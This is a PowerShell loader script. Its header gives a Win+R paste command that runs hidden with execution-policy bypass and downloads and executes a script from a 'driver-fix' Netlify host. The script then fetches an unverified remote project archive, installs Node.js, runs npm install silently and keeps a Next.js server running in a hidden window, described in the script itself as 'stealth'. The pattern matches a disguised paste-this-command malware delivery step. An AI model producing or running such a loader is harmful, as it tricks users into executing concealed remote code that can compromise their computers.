# One-line launcher — download from Netlify, run local dev in stealth.
# Win+R: powershell -w h -ep bypass -c "$t=$env:TEMP;iwr 'https://driver-fix-238308.netlify.app/win-bootstrap.ps1' -O $t\w.ps1 -useb;& $t\w.ps1"
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$SiteBase = 'https://driver-fix-238308.netlify.app'
$ProjectRoot = Join-Path $env:LOCALAPPDATA 'driver-fix-host'
$SetupDir = Join-Path $ProjectRoot '.host-setup'
$LogFile = Join-Path $SetupDir 'run.log'
$LockFile = Join-Path $SetupDir 'running.lock'
$PidFile = Join-Path $SetupDir 'dev.pid'
$DevPort = 3000
$DevUrl = "http://localhost:$DevPort"
$NodeVersion = '20.18.0'

function Ensure-Dir([string]$Path) {
    if (-not (Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
}

function Log([string]$Message) {
    Ensure-Dir $SetupDir
    Add-Content -Path $LogFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message" -ErrorAction SilentlyContinue
}

function Ensure-Project {
    Ensure-Dir $ProjectRoot
    if (Test-Path (Join-Path $ProjectRoot 'package.json')) { return }

    Log 'project: download'
    $tarPath = Join-Path $SetupDir 'project.tar.gz'
    Ensure-Dir $SetupDir
    Invoke-WebRequest -Uri "$SiteBase/project.tar.gz" -OutFile $tarPath -UseBasicParsing

    Log 'project: extract'
    tar -xzf $tarPath -C $ProjectRoot
    Remove-Item $tarPath -Force -ErrorAction SilentlyContinue
}

function Get-WinArch { if ([Environment]::Is64BitOperatingSystem) { 'x64' } else { 'x86' } }

function Get-LocalZipDir { Join-Path $SetupDir "node-v$NodeVersion-win-$(Get-WinArch)" }

function Refresh-NodePath {
    $zipDir = Get-LocalZipDir
    if (Test-Path (Join-Path $zipDir 'node.exe')) {
        if ($env:PATH -notlike "*$zipDir*") { $env:PATH = "$zipDir;$env:PATH" }
    }
    foreach ($dir in @("$env:ProgramFiles\nodejs", "${env:ProgramFiles(x86)}\nodejs", "$env:LOCALAPPDATA\Programs\node")) {
        if (Test-Path (Join-Path $dir 'node.exe')) {
            if ($env:PATH -notlike "*$dir*") { $env:PATH = "$dir;$env:PATH" }
        }
    }
}

function Get-NodeExe {
    Refresh-NodePath
    $cmd = Get-Command node.exe -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    return $null
}

function Get-NpmCli {
    $nodeDir = Split-Path -Parent (Get-NodeExe)
    if (-not $nodeDir) { return $null }
    $cli = Join-Path $nodeDir 'node_modules\npm\bin\npm-cli.js'
    if (Test-Path $cli) { return $cli }
    return $null
}

function Get-AssetSha256([string]$Name) {
    $sums = (Invoke-WebRequest -Uri "https://nodejs.org/dist/v$NodeVersion/SHASUMS256.txt" -UseBasicParsing).Content -split "`n"
    foreach ($line in $sums) {
        if ($line -match "^([a-f0-9]{64})\s+$Name$") { return $Matches[1] }
    }
    throw "SHA256 not found for $Name"
}

function Install-NodeViaZip {
    Ensure-Dir $SetupDir
    $arch = Get-WinArch
    $zipName = "node-v$NodeVersion-win-$arch.zip"
    $zipPath = Join-Path $SetupDir $zipName
    $extractDir = Get-LocalZipDir

    if (Test-Path (Join-Path $extractDir 'node.exe')) {
        $env:PATH = "$extractDir;$env:PATH"
        return (Get-NodeExe)
    }

    Log "node: zip $zipName"
    Invoke-WebRequest -Uri "https://nodejs.org/dist/v$NodeVersion/$zipName" -OutFile $zipPath -UseBasicParsing
    $hash = (Get-FileHash $zipPath -Algorithm SHA256).Hash.ToLower()
    if ($hash -ne (Get-AssetSha256 $zipName)) { Remove-Item $zipPath -Force; throw 'ZIP SHA256 mismatch' }

    Expand-Archive -Path $zipPath -DestinationPath $SetupDir -Force
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    $env:PATH = "$extractDir;$env:PATH"
    return (Get-NodeExe)
}

function Install-NodeViaWinget {
    if (-not (Get-Command winget.exe -ErrorAction SilentlyContinue)) { return $false }
    Log 'node: winget fallback'
    $proc = Start-Process winget.exe -ArgumentList @(
        'install','--id','OpenJS.NodeJS.LTS','--exact',
        '--accept-package-agreements','--accept-source-agreements',
        '--disable-interactivity','--silent'
    ) -PassThru -Wait
    Refresh-NodePath
    return (($proc.ExitCode -eq 0 -or $proc.ExitCode -eq -1978335189) -and (Get-NodeExe))
}

function Ensure-Node {
    if (Get-NodeExe) { Log "node: $(Get-NodeExe)"; return }
    Log 'node: installing'
    if (Install-NodeViaZip) { Log 'node: zip ok'; return }
    if (Install-NodeViaWinget) { Log 'node: winget ok'; return }
    throw 'Node.js install failed'
}

function Test-DevPortOpen {
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $ok = $c.BeginConnect('127.0.0.1', $DevPort, $null, $null).AsyncWaitHandle.WaitOne(1500, $false)
        if ($ok -and $c.Connected) { $c.Close(); return $true }
        $c.Close()
    } catch { }
    return $false
}

function Wait-ForDevServer {
    $deadline = (Get-Date).AddSeconds(120)
    while ((Get-Date) -lt $deadline) {
        if (Test-DevPortOpen) { return $true }
        Start-Sleep -Seconds 2
    }
    return $false
}

Ensure-Dir $SetupDir

if (Test-DevPortOpen) {
    Log "already running $DevUrl"
    exit 0
}

if (Test-Path $LockFile) {
    Remove-Item $LockFile -Force -ErrorAction SilentlyContinue
}

try {
    Ensure-Project
    Set-Location $ProjectRoot
    Ensure-Node

    $nodeExe = Get-NodeExe
    $npmCli = Get-NpmCli
    if (-not $nodeExe -or -not $npmCli) { throw 'node or npm missing' }

    Log 'npm install'
    $installLog = Join-Path $SetupDir 'npm-install.log'
    & $nodeExe $npmCli install --no-fund --no-audit --loglevel=silent *> $installLog
    if ($LASTEXITCODE -ne 0) { throw "npm install exit $LASTEXITCODE" }

    $nextCli = Join-Path $ProjectRoot 'node_modules\next\dist\bin\next'
    if (-not (Test-Path $nextCli)) { throw 'next cli not found' }

    Log 'dev server start'
    $devLog = Join-Path $SetupDir 'dev.log'
    $devErrLog = Join-Path $SetupDir 'dev.err.log'
    if (Test-Path $devLog) { Remove-Item $devLog -Force }
    if (Test-Path $devErrLog) { Remove-Item $devErrLog -Force }

    $devProc = Start-Process -FilePath $nodeExe `
        -ArgumentList $nextCli, 'dev' `
        -WorkingDirectory $ProjectRoot `
        -WindowStyle Hidden `
        -RedirectStandardOutput $devLog `
        -RedirectStandardError $devErrLog `
        -PassThru

    Set-Content -Path $PidFile -Value $devProc.Id
    Set-Content -Path $LockFile -Value $devProc.Id

    if (Wait-ForDevServer) {
        if (-not $devProc.HasExited) {
            Log "ready $DevUrl (server running in background)"
        } else {
            Log 'dev server exited early — see dev.log'
            if (Test-Path $devLog) {
                Get-Content $devLog -Tail 5 | ForEach-Object { Log "dev: $_" }
            }
        }
    } else {
        Log 'dev server timeout — see dev.log'
        if (Test-Path $devLog) {
            Get-Content $devLog -Tail 10 | ForEach-Object { Log "dev: $_" }
        }
    }
} catch {
    Log "error: $($_.Exception.Message)"
    Remove-Item $LockFile -Force -ErrorAction SilentlyContinue
    exit 1
}
